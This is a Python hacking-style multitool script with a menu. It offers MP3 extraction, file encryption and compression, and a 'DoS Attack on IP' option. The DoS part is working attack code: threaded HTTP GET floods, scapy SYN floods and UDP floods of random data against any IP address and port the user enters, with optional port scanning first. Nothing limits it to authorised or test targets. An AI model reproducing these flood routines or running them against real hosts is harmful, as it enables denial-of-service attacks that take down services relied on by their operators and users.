import os
import socket
import threading
import random
import time
from cryptography.fernet import Fernet
import base64
from scapy.all import IP, TCP, send
import sys
import subprocess

numlist = ['1','2','3','4','5','6','7','8','9','0']
usingThreading = True
hackerMode = False
insettings = False

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/90.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1"
]

def save_settings(hackerMode, usingThreading):
    with open("settings.txt", "w") as f:
        f.write('1' if usingThreading else '0')
        f.write('1' if hackerMode else '0')

def load_settings():
    try:
        with open("settings.txt", "r") as f:
            settings = f.read().strip()
        return settings[1] == '1', settings[0] == '1'
    except (FileNotFoundError, IndexError, PermissionError):
        return False, True

def hprint(text: str):
    print(f"\033[32m{text}\033[0m" if hackerMode else text)

def hinput(text: str):
    return input(f"\033[32m{text}\033[0m" if hackerMode else text)

def clear_terminal():
    os.system("cls" if os.name == "nt" else "clear")

def print_title():
    clear_terminal()
    title_art = """
\033[32m
 ______     __     __     ______     ______    
/\  == \   /\ \  _ \ \   /\  == \   /\___  \   
\ \  __<   \ \ \/ ".\ \  \ \  __<   \/_/  /__  
 \ \_____\  \ \__/".~\_\  \ \_\ \_\   /\_____\ 
  \/_____/   \/_/   \/_/   \/_/ /_/   \/_____/                                                                                                                                    
\033[0m
"""
    print(title_art)
    print_features()
    if sys.platform == "win32":
        print("\033[31mWARNING: RECOMMENDED TO RUN IN CMD, NOT POWERSHELL\033[0m")

def print_features():
    hprint("""
▆▅▃▂▁𝐅𝐞𝐚𝐭𝐮𝐫𝐞𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Extract MP3 from link
║
╠═ 2. DoS Attack on IP
║
╠═ 3. Encrypt a text file
║
╠═ 4. Decrypt the encrypted file
║
╠═ 5. Compress a file using Zstandard
║
╠═ 6. Decompress a file using Zstandard
║
╠═ 7. Settings
║     
╚═ 8. Exit
""")

def print_settings():
    hprint(f"""
▆▅▃▂▁𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬▁▂▃▅▆
╔═════════════════┃
║
╠═ 1. Use threaded port scanning (recommended)      {usingThreading}
║
╠═ 2. Green text                                    {hackerMode}
║
╚═ 3. Exit settings
""")

def encrypt_text(text, key):
    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
    cipher = Fernet(key)
    encrypted_text = cipher.encrypt(text.encode())
    return base64.urlsafe_b64encode(encrypted_text).decode()

def decrypt_text(encrypted_text_str, key):
    encrypted_text = base64.urlsafe_b64decode(encrypted_text_str.encode())
    key = base64.urlsafe_b64encode(key.ljust(32, 'X').encode())
    cipher = Fernet(key)
    return cipher.decrypt(encrypted_text).decode()

def http_flood(target_ip, target_port, time_limit):
    start_time = time.time()
    while time.time() - start_time < time_limit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((target_ip, target_port))
            user_agent = random.choice(USER_AGENTS)
            request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: {user_agent}\r\n\r\n"
            s.send(request.encode())
            s.close()
        except:
            pass

def syn_flood(target_ip, target_port, time_limit):
    start_time = time.time()
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="S")
    while time.time() - start_time < time_limit:
        try:
            send(packet, verbose=0)
        except:
            pass

def udp_flood(target_ip, target_port, time_limit):
    start_time = time.time()
    while time.time() - start_time < time_limit:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.sendto(random._urandom(2048), (target_ip, target_port))
            s.close()
        except:
            pass

def start_attack(target_ip, target_port, time_limit, threads, attack_type):
    thread_list = []
    attack_methods = {
        "http": http_flood,
        "syn": syn_flood,
        "udp": udp_flood
    }
    attack_function = attack_methods.get(attack_type, http_flood)
    for _ in range(threads):
        thread = threading.Thread(target=attack_function, args=(target_ip, target_port, time_limit))
        thread.daemon = True
        thread.start()
        thread_list.append(thread)
    for thread in thread_list:
        thread.join()

def get_helper_path(helper_name):
    base_dir = os.path.dirname(os.path.abspath(__file__))
    if sys.platform == "win32":
        return os.path.join(base_dir, "helpers", f"{helper_name}.exe")
    return os.path.join(base_dir, "helpers", f"{helper_name}")

def execute_helper(script_name, args):
    script_path = os.path.join("helpers", f"{script_name}.py")
    subprocess.run([sys.executable, script_path] + args, check=True)

hackerMode, usingThreading = load_settings()
clear_terminal()
print_title()

while True:
    try:
        option = int(hinput("Select an option: "))
        if option == 8:
            hprint("\nBye")
            break
        
        elif option == 1 and not insettings:
            link = hinput("\nEnter link: ")
            helper_path = get_helper_path("mp3")
            if not os.access(helper_path, os.X_OK):
                raise PermissionError("Helper executable missing execute permissions")
            subprocess.run([helper_path, link], check=True)
            break

        elif option == 2 and not insettings:
            target_ip = hinput("\nEnter IP address: ")
            sfp = hinput("\nDo you want to scan for open ports? (y/n): ").lower()
            if sfp == "y":
                script = "thpscan" if usingThreading else "pscan"
                execute_helper(script, [target_ip])
            
            target_port = int(hinput("\nEnter port: "))
            if not 1 <= target_port <= 65535:
                hprint("Invalid port!")
                continue
            
            time_limit = int(hinput("\nEnter attack duration (seconds): "))
            threads = int(hinput("\nEnter number of threads the attack should use: "))
            if threads > 120:
                hprint("Number of threads too high. Setting to 20.")
                threads = 20
            attack_type = hinput("\nEnter attack type (http/syn/udp): ").lower()
            if attack_type not in ["http", "syn", "udp"]:
                hprint("\nInvalid attack type. Defaulting to HTTP flood.")
                attack_type = "http"
            hprint("Starting attack...")
            start_attack(target_ip, target_port, time_limit, threads, attack_type)
            hprint("Attack completed.")
            break

        elif option == 3 and not insettings:
            filename = hinput("Enter the file to encrypt: ")
            if not os.path.exists(filename):
                raise FileNotFoundError(f"'{filename}' not found")
            with open(filename, "r") as f:
                text = f.read()
            print("\n\033[31mWARNING: THE KEY WILL NOT BE SAVED LOCALLY\033[0m\n")
            manualorpregenerated = hinput("Use a pregenerated key? (y/n): ").lower()
            key = ''.join(random.choices(numlist, k=32)) if manualorpregenerated == "y" else input("\nEnter your 32-digit key: ")
            if manualorpregenerated == "y" and input("\nSave the key locally anyways? (y/n): ").lower() == "y":
                with open("key.txt", "w") as keyfile:
                    keyfile.write(key)
                hprint("Key saved as key.txt")
            enc_filename = f"encrypted_{filename}"
            with open(enc_filename, "w") as enc:
                enc.write(encrypt_text(text, key))
            hprint(f"\nEncrypted file created: {enc_filename}")
            break

        elif option == 4:
            filename = hinput("Enter the file to decrypt: ")
            with open(filename, "r") as f:
                text = f.read()
            key = hinput("\nEnter your 32-digit key: ")
            dec_filename = f"decrypted_{filename}"
            with open(dec_filename, "w") as dec:
                dec.write(decrypt_text(text, key))
            hprint(f"\nDecrypted file created: {dec_filename}")
            break
        
        elif option == 5:
            if os.name == "nt":
                os.system("python ./helpers/compress.py")
                break
            elif os.name == "posix":
                os.system("python3 helpers/compress.py")
            else:
                hprint("\nUnsupported OS for compression\n")
        
        elif option == 6:
            if os.name == "nt":
                os.system("python ./helpers/decompress.py")
                break
            elif os.name == "posix":
                os.system("python3 helpers/decompress.py")
            else:
                hprint("\nUnsupported OS for decompression\n")
            break
        
        elif option == 7:
            clear_terminal()
            insettings = True
            print_settings()
            
        elif option == 1 and insettings:
            usingThreading = not usingThreading
            save_settings(hackerMode, usingThreading)
            clear_terminal()
            print_settings()
            
        elif option == 2 and insettings:
            hackerMode = not hackerMode
            save_settings(hackerMode, usingThreading)
            clear_terminal()
            print_settings()
            
        elif option == 3 and insettings:
            insettings = False
            clear_terminal()
            print_title()
            
    except ValueError:
        hprint("\nInvalid input.\n")
    except FileNotFoundError as e:
        hprint(f"\nError: {e}\n")
    except PermissionError as e:
        hprint(f"\nPermission error: {e}\nTry 'chmod +x {get_helper_path('mp3')}' on Linux\n")
    except subprocess.CalledProcessError:
        hprint("\nHelper execution failed\n")
    except KeyboardInterrupt:
        hprint("\nOperation cancelled by user\n")
        break